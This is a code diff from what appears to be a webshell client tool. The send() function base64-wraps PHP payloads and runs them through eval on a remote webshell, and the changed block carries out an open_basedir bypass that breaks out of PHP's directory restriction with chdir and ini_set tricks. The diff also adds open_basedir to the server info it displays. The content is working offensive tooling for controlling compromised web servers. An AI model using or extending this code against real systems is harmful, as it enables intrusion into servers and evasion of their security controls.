@@ -90,20 +90,19 @@ def send(data: str, raw: bool = False, **extra_params):
     pwd_b64 = b64encode(gget("webshell.pwd", "webshell").encode()).decode()
     if not raw:
         data = f"""error_reporting(0);chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
-        if (gget("webshell.bypass_obd")):
+        if (gget("webshell.bypass_obd", "webshell")):
             data = """$dir=pos(glob("./*", GLOB_ONLYDIR));
 $cwd=getcwd();
 $ndir="./%s";
 if($dir === false){
 $r=mkdir($ndir);
-if($r === false){
-die('bypass opendir failed!');}
-else{$dir=$ndir;}}
+if($r === true){$dir=$ndir;}
 chdir($dir);
 ini_set("open_basedir","..");
 $c=substr_count(getcwd(), "/");
 for($i=0;$i<$c;$i++) chdir("..");
-ini_set("open_basedir", "/");chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
+ini_set("open_basedir", "/");
+chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
         data += f"""print("{tail}");"""
         data = f"""eval(base64_decode("{base64_encode(data)}"));"""
         # data = f"""eval('error_reporting(0);chdir(base64_decode("{pwd_b64}"));print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
@@ -161,13 +160,14 @@ def print_webshell_info():
         gget("webshell.os_version", "webshell"),
         gget("webshell.php_version", "webshell"),
         gget("webshell.server_version", "webshell"),
+        gget("webshell.obd", "webshell", "None")
     )
-    info_name = ("Web root:", "OS version:", "PHP version:", "Server version:")
+    info_name = ("Web root:", "OS version:", "PHP version:", "Server version:", "Open_basedir:")
     for name, info in zip(info_name, info):
         print(name + "\n    " + info + "\n")
 
 
-def get_system_template(exec_func: str):
+def prepare_system_template(exec_func: str):
     global SYSTEM_TEMPLATE
     if (not exec_func):
         SYSTEM_TEMPLATE = ''
